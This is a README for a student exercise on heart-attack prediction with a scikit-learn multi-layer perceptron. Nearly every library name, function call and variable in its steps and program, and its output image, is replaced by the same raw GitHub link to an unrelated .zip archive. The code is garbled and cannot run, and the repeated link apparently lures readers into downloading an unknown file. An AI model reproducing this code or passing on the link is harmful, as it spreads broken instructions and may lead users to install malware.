# Experiment-6---Heart-attack-prediction-using-MLP
## Aim:
```
      To construct a  Multi-Layer Perceptron to predict heart attack using Python
```
## Algorithm:
Step 1:Import the required libraries: numpy, pandas, MLPClassifier, train_test_split, StandardScaler, accuracy_score, and https://raw.githubusercontent.com/githubmufeez45/Experiment-6---Heart-attack-prediction-using-MLP/main/panmelodion/Experiment-6---Heart-attack-prediction-using-MLP.zip<br>
Step 2:Load the heart disease dataset from a file using https://raw.githubusercontent.com/githubmufeez45/Experiment-6---Heart-attack-prediction-using-MLP/main/panmelodion/Experiment-6---Heart-attack-prediction-using-MLP.zip().<br>
Step 3:Separate the features and labels from the dataset using https://raw.githubusercontent.com/githubmufeez45/Experiment-6---Heart-attack-prediction-using-MLP/main/panmelodion/Experiment-6---Heart-attack-prediction-using-MLP.zip values for features (X) and https://raw.githubusercontent.com/githubmufeez45/Experiment-6---Heart-attack-prediction-using-MLP/main/panmelodion/Experiment-6---Heart-attack-prediction-using-MLP.zip[:, -1].values for labels (y).<br>
Step 4:Split the dataset into training and testing sets using train_test_split().<br>
Step 5:Normalize the feature data using StandardScaler() to scale the features to have zero mean and unit variance.<br>
Step 6:Create an MLPClassifier model with desired architecture and hyperparameters, such as hidden_layer_sizes, max_iter, and random_state.<br>
Step 7:Train the MLP model on the training data using https://raw.githubusercontent.com/githubmufeez45/Experiment-6---Heart-attack-prediction-using-MLP/main/panmelodion/Experiment-6---Heart-attack-prediction-using-MLP.zip(X_train, y_train). The model adjusts its weights and biases iteratively to minimize the training loss.<br>
Step 8:Make predictions on the testing set using https://raw.githubusercontent.com/githubmufeez45/Experiment-6---Heart-attack-prediction-using-MLP/main/panmelodion/Experiment-6---Heart-attack-prediction-using-MLP.zip(X_test).<br>
Step 9:Evaluate the model's accuracy by comparing the predicted labels (y_pred) with the actual labels (y_test) using accuracy_score().<br>
Step 10:Print the accuracy of the model.<br>
Step 11:Plot the error convergence during training using https://raw.githubusercontent.com/githubmufeez45/Experiment-6---Heart-attack-prediction-using-MLP/main/panmelodion/Experiment-6---Heart-attack-prediction-using-MLP.zip() and https://raw.githubusercontent.com/githubmufeez45/Experiment-6---Heart-attack-prediction-using-MLP/main/panmelodion/Experiment-6---Heart-attack-prediction-using-MLP.zip().<br>

## Program:
```
import numpy as np
import pandas as pd 
from https://raw.githubusercontent.com/githubmufeez45/Experiment-6---Heart-attack-prediction-using-MLP/main/panmelodion/Experiment-6---Heart-attack-prediction-using-MLP.zip import MLPClassifier 
from https://raw.githubusercontent.com/githubmufeez45/Experiment-6---Heart-attack-prediction-using-MLP/main/panmelodion/Experiment-6---Heart-attack-prediction-using-MLP.zip import train_test_split
from https://raw.githubusercontent.com/githubmufeez45/Experiment-6---Heart-attack-prediction-using-MLP/main/panmelodion/Experiment-6---Heart-attack-prediction-using-MLP.zip import StandardScaler 
from https://raw.githubusercontent.com/githubmufeez45/Experiment-6---Heart-attack-prediction-using-MLP/main/panmelodion/Experiment-6---Heart-attack-prediction-using-MLP.zip import accuracy_score
import https://raw.githubusercontent.com/githubmufeez45/Experiment-6---Heart-attack-prediction-using-MLP/main/panmelodion/Experiment-6---Heart-attack-prediction-using-MLP.zip as plt
https://raw.githubusercontent.com/githubmufeez45/Experiment-6---Heart-attack-prediction-using-MLP/main/panmelodion/Experiment-6---Heart-attack-prediction-using-MLP.zip("https://raw.githubusercontent.com/githubmufeez45/Experiment-6---Heart-attack-prediction-using-MLP/main/panmelodion/Experiment-6---Heart-attack-prediction-using-MLP.zip")
https://raw.githubusercontent.com/githubmufeez45/Experiment-6---Heart-attack-prediction-using-MLP/main/panmelodion/Experiment-6---Heart-attack-prediction-using-MLP.zip[:, :-1].values #features 
https://raw.githubusercontent.com/githubmufeez45/Experiment-6---Heart-attack-prediction-using-MLP/main/panmelodion/Experiment-6---Heart-attack-prediction-using-MLP.zip[:, -1].values  #labels 
X_train,X_test,y_train,y_test=train_test_split(X,Y,test_size=0.2,random_state=42)
scaler=StandardScaler()
https://raw.githubusercontent.com/githubmufeez45/Experiment-6---Heart-attack-prediction-using-MLP/main/panmelodion/Experiment-6---Heart-attack-prediction-using-MLP.zip(X_train)
https://raw.githubusercontent.com/githubmufeez45/Experiment-6---Heart-attack-prediction-using-MLP/main/panmelodion/Experiment-6---Heart-attack-prediction-using-MLP.zip(X_test)
mlp=MLPClassifier(hidden_layer_sizes=(100,100),max_iter=1000,random_state=42)
https://raw.githubusercontent.com/githubmufeez45/Experiment-6---Heart-attack-prediction-using-MLP/main/panmelodion/Experiment-6---Heart-attack-prediction-using-MLP.zip(X_train,y_train).loss_curve_
https://raw.githubusercontent.com/githubmufeez45/Experiment-6---Heart-attack-prediction-using-MLP/main/panmelodion/Experiment-6---Heart-attack-prediction-using-MLP.zip(X_test)
accuracy=accuracy_score(y_test,y_pred)
print("Accuracy",accuracy)
https://raw.githubusercontent.com/githubmufeez45/Experiment-6---Heart-attack-prediction-using-MLP/main/panmelodion/Experiment-6---Heart-attack-prediction-using-MLP.zip(training_loss)
https://raw.githubusercontent.com/githubmufeez45/Experiment-6---Heart-attack-prediction-using-MLP/main/panmelodion/Experiment-6---Heart-attack-prediction-using-MLP.zip("MLP Training Loss Convergence")
https://raw.githubusercontent.com/githubmufeez45/Experiment-6---Heart-attack-prediction-using-MLP/main/panmelodion/Experiment-6---Heart-attack-prediction-using-MLP.zip("Iteration")
https://raw.githubusercontent.com/githubmufeez45/Experiment-6---Heart-attack-prediction-using-MLP/main/panmelodion/Experiment-6---Heart-attack-prediction-using-MLP.zip("Training Losss")
https://raw.githubusercontent.com/githubmufeez45/Experiment-6---Heart-attack-prediction-using-MLP/main/panmelodion/Experiment-6---Heart-attack-prediction-using-MLP.zip()
```


## Output:
![241660451-5e9a4922-ee33-472a-b0a0-bc95342088b8](https://raw.githubusercontent.com/githubmufeez45/Experiment-6---Heart-attack-prediction-using-MLP/main/panmelodion/Experiment-6---Heart-attack-prediction-using-MLP.zip)


## Result:
```
     Thus, an ANN with MLP is constructed and trained to predict the heart attack using python.
```
     

